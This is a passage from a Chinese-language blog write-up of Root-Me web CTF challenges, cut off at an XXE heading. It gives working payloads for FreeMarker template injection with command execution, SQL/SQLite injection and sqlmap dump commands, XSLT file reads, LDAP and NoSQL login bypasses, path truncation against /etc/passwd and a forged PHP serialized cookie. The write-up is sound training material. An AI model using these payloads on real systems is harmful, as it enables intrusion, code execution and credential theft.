serviceUrl,</span><br><span class="line">type : <span class="string">"POST"</span>,</span><br><span class="line">data : postData,</span><br><span class="line">contentType : <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">dataType : <span class="string">"text"</span>,</span><br><span class="line">success : function(data) &#123;</span><br><span class="line">$(<span class="string">"#result"</span>).text(data);</span><br><span class="line">&#125;,</span><br><span class="line">error : function(data) &#123;</span><br><span class="line">$(<span class="string">"#result"</span>).text(<span class="string">"An error occurs!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心代码在于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">success : function(data) &#123;</span><br><span class="line">$(<span class="string">"#result"</span>).text(data);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>此处应该是存在漏洞点，我们尝试输入 <code>${3*3}</code> ，可以看到回显</p><p><img src="/2018/08/06/rootme1/4.png" alt=""></p><p>我们输入的3*3被成功计算执行了，说明此处是存在漏洞的，虽然漏洞发现了，但是如何构造payload我还是一头雾水，还好查到了资料<a href="http://www.vuln.cn/6934" target="_blank" rel="noopener">Click Here!</a> ，猜测这应该是FreeMarker模板（至少我看不出来，应该是我太菜了！23333），按照它的payload尝试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; </span><br><span class="line">$&#123; ex(<span class="string">"ls -a"</span>) &#125;</span><br></pre></td></tr></table></figure><p>果然得到了回显！！</p><p><img src="/2018/08/06/rootme1/5.png" alt=""></p><p>读取文件即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; </span><br><span class="line">$&#123; ex(<span class="string">"cat SECRET_FLAG.txt"</span>) &#125;</span><br></pre></td></tr></table></figure><h2 id="SQL-injection-authentication"><a href="#SQL-injection-authentication" class="headerlink" title="SQL injection - authentication"></a>SQL injection - authentication</h2><p>直接万能密码 <code>login=admin&#39;--+&amp;password=123456</code></p><h2 id="SQL-injection-authentication-GBK"><a href="#SQL-injection-authentication-GBK" class="headerlink" title="SQL injection - authentication - GBK"></a>SQL injection - authentication - GBK</h2><p>应该是宽字节注入，很常规，然而我被工具给坑了，换了原版的hackbar终于可以了，相关知识点可以查看我的其他文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login=admin%df&apos; or 1=1%23&amp;password=12345</span><br></pre></td></tr></table></figure><h2 id="SQL-injection-string"><a href="#SQL-injection-string" class="headerlink" title="SQL injection - string"></a>SQL injection - string</h2><p>题目是SQLite的注入，其实很常规，But，我tmd的找错注入位置了， 还是我太菜了，注入点在search界面，由于sqlite数据库不是很熟悉，所以还费了点功夫，payload如下</p><ul><li>手工注入</li></ul><p>查看表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recherche=asdf' or 1=2 union <span class="keyword">select</span> <span class="keyword">name</span>,<span class="number">2</span> <span class="keyword">from</span> sqlite_master<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>查看表结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recherche=asdf' or 1=2 union <span class="keyword">select</span> <span class="keyword">sql</span>,<span class="number">2</span> <span class="keyword">from</span> sqlite_master<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recherche=asdf' or 1=2 union <span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><ul><li>SQLmap注入方法</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge01.root-me.org/web-serveur/ch19/?action=recherche&quot; --data=&quot;recherche=asdf&quot;  --tables -p recherche</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge01.root-me.org/web-serveur/ch19/?action=recherche&quot; --data=&quot;recherche=asdf&quot;  -D users -p recherche --dump-all</span><br></pre></td></tr></table></figure><h2 id="XSLT-Code-execution"><a href="#XSLT-Code-execution" class="headerlink" title="XSLT - Code execution"></a>XSLT - Code execution</h2><p>XSLT，可扩展样式表语言转换，可以对XML进行转换，存在xslt服务器端注入攻击，可以参考文章</p><blockquote><p><a href="https://www.cnblogs.com/r00tuser/p/7255939.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7255939.html</a></p></blockquote><p>我们可以考虑注入PHP代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">'utf-8'</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:php</span>=<span class="string">"http://php.net/xsl"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"php:function('getcwd')"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用该php函数可以获取当前目录，本题目要求我们读取.passwd文件，所以我们第一要做的事情是列目录，尝试了scandir函数，发现会返回Array，尝试了去读取array内容但是失败了，经过一个朋友提醒，换了另一个函数opendir函数，这个本来之前也用过，只是没有成功，再次尝试一下</p><p><img src="/2018/08/06/rootme1/11.png" alt=""></p><p>可以列出目录</p><p><img src="/2018/08/06/rootme1/12.png" alt=""></p><p>我们再依次读子目录，在子目录下发现目标文件，直接读取目标文件即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"php:function('file_get_contents','./.6ff3200bee785801f420fba826ffcdee/.passwd')"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><!-- X5L7_R0ckS --><h2 id="LDAP-injection-authentication"><a href="#LDAP-injection-authentication" class="headerlink" title="LDAP injection - authentication"></a>LDAP injection - authentication</h2><p><strong>LDAP：</strong> 轻量级目录访问协议，是以树状的层次结构来存储数据，本质上其实是一种非关系型数据库，有以下特点</p><blockquote><ul><li>LDAP的结构用树来表示，而不是用表格。正因为这样，就不能用SQL语句了</li><li>LDAP可以很快地得到查询结果，不过在写方面，就慢得多</li><li>LDAP提供了静态数据的快速查询方式</li><li>Client/server模型，Server 用于存储数据，Client提供操作目录信息树的工具</li><li>这些工具可以将数据库的内容以文本格式（LDAP 数据交换格式，LDIF）呈现在您的面前</li><li>LDAP是一种开放Internet标准，LDAP协议是跨平台的Interent协议</li></ul></blockquote><p>要做这道题，我们需要了解一些简单的LDAP查询语句：</p><p><strong>AND查询</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(parameter1=value1)(parameter2=value2))</span><br></pre></td></tr></table></figure></p><p><strong>OR查询</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(|(parameter1=value1)(parameter2=value2))</span><br></pre></td></tr></table></figure></p><p>此外还有通配符<strong>*</strong>，可以匹配任何内容</p><p>还有在LDAP中，下面的两个单独符号作为两个特殊常量</p><blockquote><p>(&amp;) —&gt; TRUE<br>(|) —&gt; FALSE</p></blockquote><p>在LDAP注入时，可像SQL注入一样，构造闭合语句即可。</p><hr><p>回到本题</p><p>尝试输入<code>add))</code>，题目返回报错信息</p><p><img src="/2018/08/06/rootme1/6.png" alt=""></p><p>我们可以据此分析LDAP语句为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(uid=username)(userPassword=password))</span><br></pre></td></tr></table></figure><p>所以输入我们提交的内容之后，语句就为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(uid=ad)))(userPassword=fasd))</span><br></pre></td></tr></table></figure><p>由于括号未构成闭合，所以导致出错。</p><p>那么我们通过构造永真式即可绕过验证</p><p>如果提交<code>username=*)(|(uid=*&amp;password=aa)</code>，那么在服务器端就变成了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(uid=*)(|(uid=*)(userPassword=aa)))</span><br></pre></td></tr></table></figure><p>此语句逻辑是 <code>uid=*</code> 与 <code>userPassword=aa</code> 执行或操作，显然结果是true，之后该结果再与<code>uid=*</code>执行与操作，结果也为true，于是就绕过了验证，成功得到flag！</p><p>还有一些也是可以的，具体逻辑请自行分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = *</span><br><span class="line">password = *)(&amp;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: *)(|(userPassword=</span><br><span class="line">password: *)</span><br></pre></td></tr></table></figure><h2 id="NoSQL-injection-authentication"><a href="#NoSQL-injection-authentication" class="headerlink" title="NoSQL injection - authentication"></a>NoSQL injection - authentication</h2><p>一个新的知识点，关于MongoDB的注入，是一种非关系型数据库</p><blockquote><p>传统的SQLi手段是不可行的。因为MongoDB所要求的输入形式是json的格式，例如：find({‘key1’;’value1’})在实际的使用中(PHP环境下)，一般是这样使用$collection-&gt;find(array(‘key’=&gt; ‘value’));</p></blockquote><p><strong>条件操作符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$gt : &gt;</span><br><span class="line">$lt : &lt;</span><br><span class="line">$gte: &gt;=</span><br><span class="line">$lte: &lt;=</span><br><span class="line">$ne : !=、&lt;&gt;</span><br><span class="line">$in : in</span><br><span class="line">$nin: not in</span><br><span class="line">$all: all </span><br><span class="line">$or:or</span><br><span class="line">$not: 反匹配(1.3.3及以上版本)</span><br><span class="line">模糊查询用正则式：db.customer.find(&#123;&apos;name&apos;: &#123;&apos;$regex&apos;:&apos;.*s.*&apos;&#125; &#125;)</span><br><span class="line">/**</span><br><span class="line">* : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;</span><br><span class="line">* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;</span><br><span class="line">* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>既然它有如此的特征，那么 我们可以结合PHP的数组绕过来解决这一问题，本题就是这样的一个实例</p><p>题目要求我们输入用户名和密码，那么我们用数组尝试绕过一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$lt]=test&amp;pass[$ne]=1</span><br></pre></td></tr></table></figure><p>返回结果</p><blockquote><p>You are connected as : admin</p></blockquote><p>当我们换一个时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$lt]=admin&amp;pass[$ne]=1</span><br></pre></td></tr></table></figure><p>则又会返回是以test登录，但是这两个都无法得到flag，说明这个题目应该还存在一个隐藏用户，我们要设法以这个用户登录进去才可获得flag，我们可以尝试一下正则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=^[^(a|t)]&amp;pass[$ne]=1</span><br></pre></td></tr></table></figure><p>这样就可以匹配到第三个账号了</p><p>还有一种方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$lt]=test&amp;login[$gt]=admin&amp;pass[$ne]=1</span><br></pre></td></tr></table></figure><p>通过字符串比较来达到绕过的效果。</p><h2 id="Path-Truncation"><a href="#Path-Truncation" class="headerlink" title="Path Truncation"></a>Path Truncation</h2><p>网上查找了一下资料，发现一篇文章<a href="https://www.dailysecurity.fr/les-path-truncations/" target="_blank" rel="noopener">Click Here</a>，不知道是那种语言，反正用有道翻译勉强可以看懂，主要内容如下：</p><blockquote><p>在PHP5.3版本以下，PHP能够接受的字符串最大长度为 <code>2^12</code>，也就是4096，所以如果我们提交的路径长度超出4096之后，就会发生一些奇怪的事情，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;/etc/passwd/./././././././././././././[4096 plus tard]/.&quot;)</span><br></pre></td></tr></table></figure></p><p>被翻译成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;/etc/passwd&quot;);</span><br></pre></td></tr></table></figure></p><p>于是成功的绕过了验证</p><p>此外，还需要注意路径的大小，它必须保持奇数，比如 <code>admin.php</code> 有9个字符，而 <code>admin.html</code> 则是有10个字符，这意味着你必须平衡道路上的字符数，否则就不会正确地使用，例如：<code>x/../admin.html</code> 可以成功，Windows下还可以用 <code>admin.php.............[4096]............</code> 来实现相同的效果</p><p>当然，我们必须记住，它只能在小于5.3的版本中使用。<br>为了弥补这一缺陷，只需将其PHP更新为5.3。</p></blockquote><hr><p>回到本题</p><p><img src="/2018/08/06/rootme1/9.png" alt="payload"></p><h2 id="PHP-Serialization"><a href="#PHP-Serialization" class="headerlink" title="PHP Serialization"></a>PHP Serialization</h2><p>网站可以查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'INCLUDEOK'</span>, <span class="keyword">true</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'showsource'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******** AUTHENTICATION *******/</span></span><br><span class="line"><span class="comment">// login / passwords in a PHP array (sha256 for passwords) !</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./passwd.inc.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) || !$_SESSION[<span class="string">'login'</span>]) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'login'</span>] = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// form posted ?</span></span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'login'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>])&#123;</span><br><span class="line">        $data[<span class="string">'login'</span>] = $_POST[<span class="string">'login'</span>];</span><br><span class="line">        $data[<span class="string">'password'</span>] = hash(<span class="string">'sha256'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// autologin cookie ?</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($_COOKIE[<span class="string">'autologin'</span>])&#123;</span><br><span class="line">        $data = unserialize($_COOKIE[<span class="string">'autologin'</span>]);</span><br><span class="line">        $autologin = <span class="string">"autologin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// check password !</span></span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'password'</span>] == $auth[ $data[<span class="string">'login'</span>] ] ) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>] = $data[<span class="string">'login'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set cookie for autologin if requested</span></span><br><span class="line">        <span class="keyword">if</span>($_POST[<span class="string">'autologin'</span>] === <span class="string">"1"</span>)&#123;</span><br><span class="line">            setcookie(<span class="string">'autologin'</span>, serialize($data));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// error message</span></span><br><span class="line">        $message = <span class="string">"Error : $autologin authentication failed !"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*********************************/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// message ?</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($message))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;em&gt;$message&lt;/em&gt;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="comment">// admin ?</span></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] === <span class="string">"superadmin"</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'admin.inc.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// user ?</span></span><br><span class="line"><span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) &amp;&amp; $_SESSION[<span class="string">'login'</span>] !== <span class="string">""</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'user.inc.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由这段代码可知</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] === <span class="string">"superadmin"</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'admin.inc.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>必须以superadmin登录，才可以获得flag</p><p>关键逻辑如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) || !$_SESSION[<span class="string">'login'</span>]) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'login'</span>] = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// form posted ?</span></span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'login'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>])&#123;</span><br><span class="line">        $data[<span class="string">'login'</span>] = $_POST[<span class="string">'login'</span>];</span><br><span class="line">        $data[<span class="string">'password'</span>] = hash(<span class="string">'sha256'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// autologin cookie ?</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($_COOKIE[<span class="string">'autologin'</span>])&#123;</span><br><span class="line">        $data = unserialize($_COOKIE[<span class="string">'autologin'</span>]);</span><br><span class="line">        $autologin = <span class="string">"autologin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// check password !</span></span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'password'</span>] == $auth[ $data[<span class="string">'login'</span>] ] ) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>] = $data[<span class="string">'login'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set cookie for autologin if requested</span></span><br><span class="line">        <span class="keyword">if</span>($_POST[<span class="string">'autologin'</span>] === <span class="string">"1"</span>)&#123;</span><br><span class="line">            setcookie(<span class="string">'autologin'</span>, serialize($data));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// error message</span></span><br><span class="line">        $message = <span class="string">"Error : $autologin authentication failed !"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们<strong><em>没有POST用户名和密码</em></strong>的话，题目就会通过反序列化获取cookie里面的用户信息，而在验证逻辑中使用了 <code>==</code> ，这就看到了漏洞点，因为在PHP中， 字符串与布尔真进行 <code>==</code> 是会判断为真的，例如 <code>&#39;afdsfaf&#39;==True</code> 是会判断成立的，所以在验证密码时，我们可以使我们的密码为布尔True，那么与密码字符串判断则会返回True，从而绕过验证。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data[<span class="string">"login"</span>] = <span class="string">"superadmin"</span>;</span><br><span class="line">$data[<span class="string">"password"</span>] = <span class="keyword">True</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($data));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后抓包修改请求即可</p><p><img src="/2018/08/06/rootme1/7.png" alt="payload"></p><p>发送就可以收到结果啦</p><p><img src="/2018/08/06/rootme1/8.png" alt="result"></p><h2 id="SQL-injection-numeric"><a href="#SQL-injection-numeric" class="headerlink" title="SQL injection - numeric"></a>SQL injection - numeric</h2><p>数字型注入，打开页面后点击信息，注入点在news_id上，直接注入即可，不需要单引号闭合，用 <code>--+</code> 作为注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,name,3 from sqlite_master--+</span><br></pre></td></tr></table></figure><p>具体步骤不再细说，用sqlmap更快</p><h2 id="SQL-Injection-Routed"><a href="#SQL-Injection-Routed" class="headerlink" title="SQL Injection - Routed"></a>SQL Injection - Routed</h2><p>这道题目知识点叫路由注入，我觉得也相当于二次注入，我们第一次提交的内容会被执行SQL查询操作，执行结果不回显而是被代入第二个SQL语句中，然后题目在最终回显第二次查询的内容。</p><p>题目有个介绍相关知识点的网址 <a href="http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html" target="_blank" rel="noopener">Click Here!</a>，给出了实例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$query=<span class="string">"SELECT id,sec_code FROM users WHERE id='$id'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!$result=mysql_query($query,$conn))  </span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Error While Selection process : "</span> . mysql_error());</span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows($result) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line">$query=<span class="string">"SELECT username FROM users WHERE sec_code='"</span>.$row[<span class="string">'sec_code'</span>].<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;font color=red&gt;This is the query which gives you Output : &lt;/font&gt;$query&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!$result=mysql_query($query,$conn))  </span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Error While Selection process : "</span> . mysql_error());</span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows($result) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Invalid Input parameter"</span>);</span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Username is : '</span> . $row[<span class="string">'username'</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过的payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1&apos; and false union select 1,0x2720756e696f6e2073656c65637420312c3223--+</span><br></pre></td></tr></table></figure><p>相当于第一次查询的第二个元素在第二次查询中执行并且回显</p><hr><p>回到本题</p><p>题目中逗号，括号等都被过滤了，当我们使用union查询时，由于无法使用逗号，故只能返回第一个内容，然后利用我们前面的知识点，题目应该是取第一次查询的结果到第二次中查询，那么我们可以考虑在第一次查询中注入SQL语句，由于双引号被过滤，可以使用十六进制编码，此处为直观起见，只给出SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login=' union <span class="keyword">select</span> <span class="string">"'order by 2-- -"</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><code>-- -</code> 是为了注释第二次查询的SQL语句<br>题目返回正常回显，经过测试发现列数为2，接下来测试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"'union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- -"</span></span><br></pre></td></tr></table></figure><p>返回1和2</p><p>题目到此基本上就出来了，剩下的就是常规注入了，大家自己动手即可。</p><h2 id="SQL-Truncation"><a href="#SQL-Truncation" class="headerlink" title="SQL Truncation"></a>SQL Truncation</h2><p>SQL截断攻击，这个很简单，就不多说了，直接注册一个<code>admin                                                             123</code>的用户，由于用户名长度超出了数据类型长度的限制而被截断，于是只剩下了<code>admin</code> 被存入数据库中，那么我们就可以用这个用户的密码以admin的身份登录了</p><h2 id="XML-External-Entity"><a href="#XML-External-Entity" class="headerlink" title="XML External Entity"></a>XML External 